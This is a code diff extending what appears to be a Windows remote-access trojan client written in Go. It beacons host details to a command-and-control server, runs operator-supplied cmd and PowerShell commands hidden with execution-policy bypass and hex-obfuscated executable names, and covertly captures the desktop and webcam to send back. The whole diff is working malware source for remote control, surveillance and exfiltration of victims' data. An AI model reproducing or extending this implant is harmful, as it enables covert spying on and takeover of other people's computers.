@@ -10,15 +10,21 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"image"
+	"image/color"
 	"image/png"
 	"log"
 	"net"
 	"os"
+	"os/exec"
+	"os/signal"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 	"unicode/utf16"
@@ -35,17 +41,17 @@ var (
 	client            net.Conn
 	sessionId         string
 	logStream         *log.Logger
-	logEnabled        bool   = false
-	logpath           string = "logs/client.log"
-	address           string = "10.0.0.129"
-	port              string = "54678"
-	startTime         string = time.Now().UTC().String()
-	exitProcess       bool   = false
-	retryMode         bool   = false
-	maxRetries        int    = 5
-	beaconMinInterval uint32 = 5 * 60 * 1000
-	beaconMaxInterval uint32 = 45 * 60 * 1000
-	retryIntervals           = []int{
+	logEnabled        bool      = false
+	logpath           string    = "logs/client.log"
+	address           string    = "10.0.0.127"
+	port              string    = "54678"
+	startTime         time.Time = time.Now().UTC()
+	exitProcess       bool      = false
+	sentFirstBeacon   bool      = false
+	maxRetries        int       = 5
+	beaconMinInterval uint32    = 5 * 60 * 1000
+	beaconMaxInterval uint32    = 45 * 60 * 1000
+	retryIntervals              = []int{
 		10000,
 		30000,
 		(1 * 60 * 1000),
@@ -54,22 +60,32 @@ var (
 		(6 * 60 * 1000),
 	}
 
-	user32   = windows.NewLazySystemDLL("user32.dll")
-	gdi32    = windows.NewLazySystemDLL("gdi32.dll")
-	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
-	avicap32 = windows.NewLazySystemDLL("avicap32.dll")
-
+	avicap32                = windows.NewLazySystemDLL("avicap32.dll")
 	capCreateCaptureWindowA = avicap32.NewProc("capCreateCaptureWindowA")
-	sendMessageA            = user32.NewProc("SendMessageA")
-	openClipboard           = user32.NewProc("OpenClipboard")
-	closeClipboard          = user32.NewProc("CloseClipboard")
-	getClipboardData        = user32.NewProc("GetClipboardData")
-	globalLock              = kernel32.NewProc("GlobalLock")
-	globalUnlock            = kernel32.NewProc("GlobalUnlock")
-	globalSize              = kernel32.NewProc("GlobalSize")
-	createDIBSection        = gdi32.NewProc("CreateDIBSection")
-	deleteDC                = gdi32.NewProc("DeleteDC")
-	deleteObject            = gdi32.NewProc("DeleteObject")
+
+	user32           = windows.NewLazySystemDLL("user32.dll")
+	closeClipboard   = user32.NewProc("CloseClipboard")
+	getClipboardData = user32.NewProc("GetClipboardData")
+	openClipboard    = user32.NewProc("OpenClipboard")
+	sendMessageA     = user32.NewProc("SendMessageA")
+
+	kernel32     = windows.NewLazySystemDLL("kernel32.dll")
+	globalLock   = kernel32.NewProc("GlobalLock")
+	globalSize   = kernel32.NewProc("GlobalSize")
+	globalUnlock = kernel32.NewProc("GlobalUnlock")
+
+	gdi32                  = windows.NewLazySystemDLL("gdi32.dll")
+	bitBlt                 = gdi32.NewProc("BitBlt")
+	createDIBSection       = gdi32.NewProc("CreateDIBSection")
+	deleteDC               = gdi32.NewProc("DeleteDC")
+	deleteObject           = gdi32.NewProc("DeleteObject")
+	getSystemMetrics       = gdi32.NewProc("GetSystemMetrics")
+	getDC                  = gdi32.NewProc("GetDC")
+	getDIBits              = gdi32.NewProc("GetDIBits")
+	createCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
+	createCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
+	releaseDC              = gdi32.NewProc("ReleaseDC")
+	selectObject           = gdi32.NewProc("SelectObject")
 )
 
 const (
@@ -80,6 +96,10 @@ const (
 	WM_CAP_GRAB_FRAME        = 0x0400 + 60
 
 	CF_DIB = 8
+
+	SM_CXSCREEN = 0
+	SM_CYSCREEN = 1
+	SRCCOPY     = 0x00CC0020
 )
 
 type (
@@ -109,27 +129,27 @@ type (
 )
 
 func WriteLog(message string, v ...any) {
-	// Ensure the log directory exists
-	if err := os.MkdirAll(filepath.Dir(logpath), 0755); err != nil {
-		logEnabled = false
-		log.Fatalf("Failed to create log directory: %v", err)
-	}
-
-	// Open log file
-	file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		logEnabled = false
-		log.Fatalf("Failed to open log file: %v", err)
-	}
-	defer file.Close()
-
-	// Initialize logStream if necessary
-	if logStream == nil {
-		logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
-	}
-
-	// Format and write the log message
 	if logEnabled {
+		// Ensure the log directory exists
+		if err := os.MkdirAll(filepath.Dir(logpath), 0755); err != nil {
+			logEnabled = false
+			log.Fatalf("Failed to create log directory: %v", err)
+		}
+
+		// Open log file
+		file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			logEnabled = false
+			log.Fatalf("Failed to open log file: %v", err)
+		}
+		defer file.Close()
+
+		// Initialize logStream if necessary
+		if logStream == nil {
+			logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
+		}
+
+		// Format and write the log message
 		if len(v) > 0 {
 			message = fmt.Sprintf(message, v...)
 		}
@@ -262,15 +282,16 @@ func GetRetryInterval(retries int) int {
 
 // SendCommand sends encrypted data in chunks
 func SendCommand(response interface{}) {
-	// Encrypt the response
 	jsonData, err := json.Marshal(response)
 	if err != nil {
-		WriteLog("failed to marshal response: %w", err.Error())
+		WriteLog("Failed to marshal response: %v", err)
+		return
 	}
 
 	encrypted, err := EncryptData(string(jsonData), sessionId)
 	if err != nil {
-		WriteLog("failed to encrypt data: %w", err.Error())
+		WriteLog("Failed to encrypt data: %v", err)
+		return
 	}
 
 	// Split the encrypted data into chunks and send each chunk
@@ -293,6 +314,7 @@ func SendCommand(response interface{}) {
 
 			if _, err := client.Write(chunk); err != nil {
 				WriteLog("failed to write chunk to client: %w", err)
+				return
 			}
 		}
 	} else {
@@ -300,6 +322,7 @@ func SendCommand(response interface{}) {
 
 		if _, err := client.Write(encryptedBytes); err != nil {
 			WriteLog("failed to write data to client: %w", err)
+			return
 		}
 	}
 }
@@ -309,7 +332,7 @@ func SendBeacon() {
 	osver := fmt.Sprintf("%d.%d.%d", maj, min, patch)
 	hostname, err := os.Hostname()
 	if err != nil {
-		WriteLog(err.Error())
+		WriteLog("Failed to get hostname: %s", err.Error())
 		return
 	}
 	payloadData := map[string]interface{}{
@@ -325,7 +348,7 @@ func SendBeacon() {
 	}
 	payloadBytes, err := json.Marshal(payloadData)
 	if err != nil {
-		WriteLog("Failed to marshal JSON payload: " + err.Error())
+		WriteLog("Failed to marshal JSON payload: %s", err.Error())
 		return
 	}
 	payload := string(payloadBytes)
@@ -338,20 +361,16 @@ func Sleep(ms int) {
 
 // utf8To16 converts a UTF-8 string to a UTF-16 encoded byte slice.
 func utf8To16(str string) []byte {
-	// Convert the UTF-8 string to a slice of UTF-16 code units.
 	utf16Codes := utf16.Encode([]rune(str))
-	// Allocate a buffer with the size needed to hold UTF-16 code units.
 	buffer := bytes.NewBuffer(make([]byte, 0, len(utf16Codes)*2))
-	// Write each UTF-16 code unit to the buffer.
 	for _, code := range utf16Codes {
-		// Write the UTF-16 code unit in little-endian byte order.
 		buffer.WriteByte(byte(code))
 		buffer.WriteByte(byte(code >> 8))
 	}
 	return buffer.Bytes()
 }
 
-func formatFileName(name, extension string) string {
+func FormatFileName(name, extension string) string {
 	now := time.Now()
 	year := now.Year()
 	month := fmt.Sprintf("%02d", now.Month())
@@ -359,141 +378,443 @@ func formatFileName(name, extension string) string {
 	hours := fmt.Sprintf("%02d", now.Hour())
 	minutes := fmt.Sprintf("%02d", now.Minute())
 	seconds := fmt.Sprintf("%02d", now.Second())
-	// Remove leading dot from extension if it exists
 	ext := strings.TrimPrefix(extension, ".")
-	// Format the filename
 	return fmt.Sprintf("%s_%d-%s-%s_%s-%s-%s.%s", name, year, month, day, hours, minutes, seconds, ext)
 }
 
-func CaptureWebcam() error {
+func CaptureWebcam() (image.Image, error) {
+	windowName, err := windows.UTF16PtrFromString("WebcamCapture")
+	if err != nil {
+		return nil, fmt.Errorf("failed to convert window name: %v", err)
+	}
 	handle, _, err := capCreateCaptureWindowA.Call(
-		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("WebcamCapture"))),
+		uintptr(unsafe.Pointer(windowName)),
 		0, 0, 0, 320, 240, 0, 0)
 	if handle == 0 {
-		return fmt.Errorf("failed to create capture window: %v", err)
+		return nil, fmt.Errorf("failed to create capture window: %v", err)
 	}
 	defer sendMessageA.Call(handle, WM_CAP_DRIVER_DISCONNECT, 0, 0)
-
 	ret, _, err := sendMessageA.Call(handle, WM_CAP_DRIVER_CONNECT, 0, 0)
 	if ret == 0 {
-		return fmt.Errorf("failed to connect to driver: %v", err)
+		return nil, fmt.Errorf("failed to connect to driver: %v", err)
 	}
-
 	sendMessageA.Call(handle, WM_CAP_SET_PREVIEW, 1, 0)
 	sendMessageA.Call(handle, WM_CAP_GRAB_FRAME, 0, 0)
 	sendMessageA.Call(handle, WM_CAP_EDIT_COPY, 0, 0)
-
-	img, err := getImageFromClipboard()
+	img, err := GetImageFromClipboard()
 	if err != nil {
-		return fmt.Errorf("failed to get image from clipboard: %v", err)
+		return nil, fmt.Errorf("failed to get image from clipboard: %v", err)
+	}
+	return img, nil
+}
+
+func CaptureDesktop() ([]byte, error) {
+	screenDC, _, _ := getDC.Call(0)
+	if screenDC == 0 {
+		return nil, fmt.Errorf("failed to get screen device context")
+	}
+	defer releaseDC.Call(0, screenDC)
+
+	hdcMem, _, _ := createCompatibleDC.Call(screenDC)
+	if hdcMem == 0 {
+		return nil, fmt.Errorf("failed to create compatible device context")
+	}
+	defer deleteDC.Call(hdcMem)
+
+	screenWidth, _, _ := getSystemMetrics.Call(SM_CXSCREEN)
+	screenHeight, _, _ := getSystemMetrics.Call(SM_CYSCREEN)
+
+	bitmap, _, _ := createCompatibleBitmap.Call(screenDC, screenWidth, screenHeight)
+	if bitmap == 0 {
+		return nil, fmt.Errorf("failed to create compatible bitmap")
+	}
+	defer deleteObject.Call(bitmap)
+
+	oldBitmap, _, _ := selectObject.Call(hdcMem, bitmap)
+	defer selectObject.Call(hdcMem, oldBitmap)
+
+	ret, _, _ := bitBlt.Call(
+		hdcMem, 0, 0, screenWidth, screenHeight,
+		screenDC, 0, 0, SRCCOPY,
+	)
+	if ret == 0 {
+		return nil, fmt.Errorf("BitBlt failed")
 	}
 
-	filename := formatFileName("wc", "png")
-	if err := saveImageAsPNG(img, filename); err != nil {
-		return fmt.Errorf("failed to save image: %v", err)
+	// Convert the bitmap to image.Image
+	img, err := bitmapToImage(hdcMem, screenWidth, screenHeight)
+	if err != nil {
+		return nil, fmt.Errorf("failed to convert bitmap to image: %v", err)
 	}
 
-	return nil
+	// Encode the image as PNG
+	var buf bytes.Buffer
+	err = png.Encode(&buf, img)
+	if err != nil {
+		return nil, fmt.Errorf("failed to encode image as PNG: %v", err)
+	}
+
+	return buf.Bytes(), nil
+}
+
+func bitmapToImage(hdcMem, width, height uintptr) (image.Image, error) {
+	// Prepare BITMAPINFO structure
+	bmi := BITMAPINFO{
+		BmiHeader: BITMAPINFOHEADER{
+			BiSize:        uint32(unsafe.Sizeof(BITMAPINFOHEADER{})),
+			BiWidth:       int32(width),
+			BiHeight:      int32(-height), // Negative height to specify top-down DIB
+			BiPlanes:      1,
+			BiBitCount:    24, // 24 bits per pixel (RGB)
+			BiCompression: 0,  // BI_RGB, no compression
+		},
+	}
+
+	// Get the size of the bitmap data
+	var bmpSize uint32
+	_, _, _ = getDIBits.Call(
+		hdcMem,
+		0, // Bitmap handle is not necessary for this call
+		0,
+		0,
+		uintptr(unsafe.Pointer(&bmi)),
+		0,
+		uintptr(unsafe.Pointer(&bmpSize)),
+	)
+	if bmpSize == 0 {
+		return nil, fmt.Errorf("failed to get bitmap data size")
+	}
+
+	// Allocate buffer for the bitmap data
+	data := make([]byte, bmpSize)
+
+	// Get the bitmap data
+	_, _, _ = getDIBits.Call(
+		hdcMem,
+		0, // Bitmap handle is not necessary for this call
+		0,
+		height,
+		uintptr(unsafe.Pointer(&bmi)),
+		uintptr(unsafe.Pointer(&data[0])),
+		0,
+	)
+
+	// Create an RGBA image
+	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
+
+	// Copy the pixel data to the image
+	rowSize := (width*3 + 3) &^ 3 // Row size rounded up to the nearest 4 bytes
+	for y := 0; y < int(height); y++ {
+		for x := 0; x < int(width); x++ {
+			offset := (y*int(rowSize) + x*3)
+			r := data[offset+2]
+			g := data[offset+1]
+			b := data[offset+0]
+			img.Set(x, int(height)-y-1, color.RGBA{R: r, G: g, B: b, A: 255})
+		}
+	}
+
+	return img, nil
 }
 
 // Retrieves an image from the clipboard.
-func getImageFromClipboard() (image.Image, error) {
+func GetImageFromClipboard() (image.Image, error) {
 	ret, _, _ := openClipboard.Call(0)
 	if ret == 0 {
 		return nil, fmt.Errorf("failed to open clipboard")
 	}
 	defer closeClipboard.Call()
-
 	handle, _, _ := getClipboardData.Call(CF_DIB)
 	if handle == 0 {
 		return nil, fmt.Errorf("failed to get clipboard data")
 	}
-
 	size, _, _ := globalSize.Call(handle)
 	ptr, _, _ := globalLock.Call(handle)
 	if ptr == 0 {
 		return nil, fmt.Errorf("failed to lock global memory")
 	}
 	defer globalUnlock.Call(handle)
-
 	bitmapInfo := (*BITMAPINFO)(unsafe.Pointer(ptr))
 	width := int(bitmapInfo.BmiHeader.BiWidth)
 	height := int(bitmapInfo.BmiHeader.BiHeight)
 	biSize := uintptr(bitmapInfo.BmiHeader.BiSize)
 	colorTableSize := uintptr(bitmapInfo.BmiHeader.BiClrUsed) * unsafe.Sizeof(RGBQUAD{})
 	dataOffset := biSize + colorTableSize
-
-	// Calculate the data size correctly
 	dataSize := uintptr(size) - dataOffset
-
 	var bits unsafe.Pointer
 	hdc, _, _ := createDIBSection.Call(0, uintptr(unsafe.Pointer(bitmapInfo)), 0, uintptr(unsafe.Pointer(&bits)), 0, 0)
 	if hdc == 0 {
 		return nil, fmt.Errorf("failed to create DIB section")
 	}
 	defer deleteObject.Call(hdc)
-
-	// Copy image data to bits
 	dataPtr := uintptr(ptr) + dataOffset
 	copy((*[1 << 30]byte)(bits)[:dataSize:dataSize], (*[1 << 30]byte)(unsafe.Pointer(dataPtr))[:dataSize:dataSize])
-
-	// Create an image
 	img := &image.RGBA{
 		Pix:    (*[1 << 30]uint8)(bits)[:width*height*4],
 		Stride: width * 4,
 		Rect:   image.Rect(0, 0, width, height),
 	}
-
 	return img, nil
 }
 
-func saveImageAsPNG(img image.Image, filename string) error {
-	file, err := os.Create(filename)
-	if err != nil {
-		return err
+func RunCommand(command string, payload string, isFile bool) (string, error) {
+	command = strings.TrimSpace(command)
+	if command == "" {
+		return "", errors.New("no command provided")
 	}
-	defer file.Close()
+	if command != "cmd" && command != "ps" {
+		return "", errors.New("unsupported command")
+	}
 
-	return png.Encode(file, img)
+	var args []string
+	switch command {
+	case "cmd":
+		if strings.Contains(payload, ";") || strings.Contains(payload, "&") {
+			return "", errors.New("invalid characters in payload")
+		}
+		args = []string{"/c", payload}
+		command = "\x63\x6d\x64\x2e\x65\x78\x65"
+	case "ps":
+		args = []string{
+			"-NonInteractive",
+			"-NoLogo",
+			"-NoProfile",
+			"-WindowStyle", "hidden",
+			"-ExecutionPolicy", "Bypass",
+		}
+		if isFile {
+			args = append(args, "-File", payload)
+		} else {
+			encodedCmd := base64.StdEncoding.EncodeToString(utf8To16(payload))
+			args = append(args, "-EncodedCommand", encodedCmd)
+		}
+		command = "\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c\x2e\x65\x78\x65"
+	}
+
+	cmd := exec.Command(command, args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+
+	var stdout, stderr bytes.Buffer
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	err := cmd.Start()
+	if err != nil {
+		WriteLog("failed to execute command: %s", err.Error())
+		return "", err
+	}
+
+	done := make(chan error, 1)
+	go func() {
+		done <- cmd.Wait()
+	}()
+
+	select {
+	case <-time.After(30 * time.Second):
+		if err := cmd.Process.Kill(); err != nil {
+			return "", fmt.Errorf("failed to kill process: %v", err)
+		}
+		return "", errors.New("command timed out")
+	case err := <-done:
+		if err != nil {
+			return "", fmt.Errorf("command failed: %v. Error output: %s", err, stderr.String())
+		}
+	}
+
+	return stdout.String(), nil
 }
 
-func HandleConnection(conn net.Conn) {
-	// Close the connection when we're done
-	defer conn.Close()
+func FormatTime(milliseconds int64) string {
+	totalSeconds := milliseconds / 1000
+	days := totalSeconds / 86400
+	hours := (totalSeconds % 86400) / 3600
+	minutes := (totalSeconds % 3600) / 60
+	seconds := totalSeconds % 60
+	return fmt.Sprintf("%dd %dh %dm %ds", days, hours, minutes, seconds)
+}
 
-	// Read incoming data
-	buf := make([]byte, 1024)
-	_, err := conn.Read(buf)
-	if err != nil {
-		WriteLog(err.Error())
+func GetUptime() string {
+	currentTime := time.Now()
+	uptimeMillis := currentTime.Sub(startTime).Milliseconds()
+	return FormatTime(uptimeMillis)
+}
+
+func ParseAction(action string) {
+	defer func() {
+		if r := recover(); r != nil {
+			SendCommand(map[string]interface{}{
+				"response": map[string]interface{}{
+					"error": fmt.Sprintf("Error: %v", r),
+				},
+			})
+		}
+	}()
+
+	// Trim and split the action string
+	action = strings.TrimSpace(action)
+	re := regexp.MustCompile(`(?:(?:"[^"]*")|(?:\S+))`)
+	parts := re.Split(action, -1)
+
+	if len(parts) < 1 {
+		SendCommand(map[string]interface{}{
+			"response": map[string]interface{}{
+				"error": "Invalid action format",
+			},
+		})
 		return
 	}
 
-	WriteLog("Received: %s", buf)
+	command := parts[0]
+	properties := parts[1:]
+
+	WriteLog("Command: %s - Properties: %s", command, strings.Join(properties, " "))
+	switch command {
+	case "ps", "cmd":
+		if len(properties) > 0 {
+			payloadBytes, err := base64.StdEncoding.DecodeString(properties[0])
+			if err != nil {
+				SendCommand(map[string]interface{}{
+					"response": map[string]interface{}{
+						"error": fmt.Sprintf("Error decoding base64: %v", err),
+					},
+				})
+				return
+			}
+			payload := string(payloadBytes)
+			RunCommand(command, payload, false)
+		}
+	case "up":
+		uptime := GetUptime()
+		SendCommand(map[string]interface{}{
+			"response": map[string]interface{}{
+				"data": uptime,
+			},
+		})
+		return
+	case "di":
+		exitProcess = true
+		if client != nil {
+			client.Close()
+		}
+		WriteLog("Exiting process.")
+		// os.Exit(0)
+		return
+	case "ss":
+		result, err := CaptureDesktop()
+		if err != nil {
+			SendCommand(map[string]interface{}{
+				"response": map[string]interface{}{
+					"error": err.Error(),
+				},
+			})
+			return
+		}
+		SendCommand(map[string]interface{}{
+			"response": map[string]interface{}{
+				"data":     result,
+				"filename": FormatFileName("ss", "png"),
+			},
+		})
+		return
+	case "wc":
+		img, err := CaptureWebcam()
+		if err != nil {
+			SendCommand(map[string]interface{}{
+				"response": map[string]interface{}{
+					"error": fmt.Sprintf("Error running webcam clip: %v", err),
+				},
+			})
+			return
+		}
+		SendCommand(map[string]interface{}{
+			"response": map[string]interface{}{
+				"data":     img,
+				"filename": FormatFileName("wc", "png"),
+			},
+		})
+		return
+	default:
+		return
+	}
+}
+
+func HandleConnection(conn net.Conn) {
+	defer conn.Close()
+	buf := make([]byte, 1024)
+	n, err := conn.Read(buf)
+	if err != nil {
+		WriteLog("Error reading from connection: %v", err)
+		return
+	}
+	if n == 0 {
+		return
+	}
+	data := buf[:n]
+
+	WriteLog("Received Data: %s", string(data))
+
+	action, err := DecryptData(string(data), sessionId)
+	if err != nil {
+		WriteLog("DecryptData error: %v", err)
+	}
+
+	if len(action) != 0 {
+		ParseAction(action)
+	}
 }
 
 func ConnectToServer() {
 	for !exitProcess {
-		// Connect to the server
-		conn, err := net.Dial("tcp", address+":"+port)
-		if err != nil {
-			WriteLog(err.Error())
-			exitProcess = true
-		}
+		if client == nil {
+			// Connect to the server
+			conn, err := net.Dial("tcp", address+":"+port)
+			if err != nil {
+				WriteLog(err.Error())
+				exitProcess = true
+			}
 
-		client = conn
+			client = conn
+		}
 
 		if len(sessionId) == 0 {
-			go GetSessionID()
+			GetSessionID()
 		}
 
-		// Send a beacon
+		if !sentFirstBeacon {
+			// Send a beacon
+			SendBeacon()
+			sentFirstBeacon = true
+		}
 
 		// Handle read response
-		go HandleConnection(client)
+		HandleConnection(client)
 	}
 }
 
 func main() {
-	go ConnectToServer()
+	var wg sync.WaitGroup
+	wg.Add(1)
+
+	go func() {
+		defer wg.Done()
+		ConnectToServer()
+	}()
+
+	// Set up a channel to listen for interrupt signals
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	// Wait for an interrupt signal
+	<-sigChan
+
+	// Set exitProcess to true to stop the connection loop
+	exitProcess = true
+
+	// Close the client connection if it's open
+	if client != nil {
+		client.Close()
+	}
+
+	// Wait for the goroutine to finish
+	wg.Wait()
 }
